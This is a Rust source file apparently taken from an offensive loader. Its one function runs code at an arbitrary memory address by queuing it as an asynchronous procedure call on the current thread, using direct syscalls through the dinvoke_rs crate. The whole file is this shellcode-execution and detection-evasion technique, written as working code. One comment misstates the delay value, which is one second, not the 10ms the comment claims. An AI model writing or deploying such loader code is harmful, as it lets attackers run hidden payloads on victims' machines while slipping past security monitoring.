use dinvoke_rs::dinvoke;
use std::ffi::c_void;
use std::ptr;
use windows::Win32::Foundation::HANDLE;

#[allow(non_snake_case)]
type NtQueueApcThread = unsafe extern "system" fn(
    ThreadHandle: HANDLE,
    ApcRoutine: Option<unsafe extern "system" fn(*mut c_void, *mut c_void, *mut c_void)>,
    ApcArgument1: *mut c_void,
    ApcArgument2: *mut c_void,
    ApcArgument3: *mut c_void,
) -> i32;

#[allow(non_snake_case)]
type NtDelayExecution = unsafe extern "system" fn(
    Alertable: u8,
    DelayInterval: *mut i64,
) -> i32;

#[allow(non_snake_case)]
type NtTestAlert = unsafe extern "system" fn() -> i32;

pub unsafe fn exec(p: usize) -> Result<(), String> {
    // Use the current thread pseudo-handle (-2).
    const CURRENT_THREAD: HANDLE = HANDLE(-2isize as isize);

    // Queue APC
    let queue_type: NtQueueApcThread;
    #[allow(unused_assignments)]
    let mut queue_status: Option<i32> = None;

    dinvoke::execute_syscall!(
        "NtQueueApcThread",
        queue_type,
        queue_status,
        CURRENT_THREAD,
        Some(core::mem::transmute::<usize, unsafe extern "system" fn(*mut c_void, *mut c_void, *mut c_void)>(p)),
        ptr::null_mut(),
        ptr::null_mut(),
        ptr::null_mut(),
    );

    if queue_status != Some(0) {
        return Err(match queue_status {
            Some(code) => format!("NtQueueApcThread failed: 0x{:x}", code),
            None => "NtQueueApcThread syscall execution failed".to_string(),
        });
    }

    // Alertable wait to deliver APC
    let delay_type: NtDelayExecution;
    #[allow(unused_assignments)]
    let mut delay_status: Option<i32> = None;
    // Relative interval: -1_000_000 * 10ns = -10ms (alertable sleep)
    let mut interval: i64 = -10_000_000;

    dinvoke::execute_syscall!(
        "NtDelayExecution",
        delay_type,
        delay_status,
        1u8, // Alertable = TRUE
        &mut interval as *mut i64,
    );

    if delay_status == Some(0) {
        // Ensure pending APCs are delivered
        let test_alert_type: NtTestAlert;
        let mut _test_status: Option<i32> = None;
        dinvoke::execute_syscall!(
            "NtTestAlert",
            test_alert_type,
            _test_status,
        );
        Ok(())
    } else {
        Err(match delay_status {
            Some(code) => format!("NtDelayExecution failed: 0x{:x}", code),
            None => "NtDelayExecution syscall execution failed".to_string(),
        })
    }
}
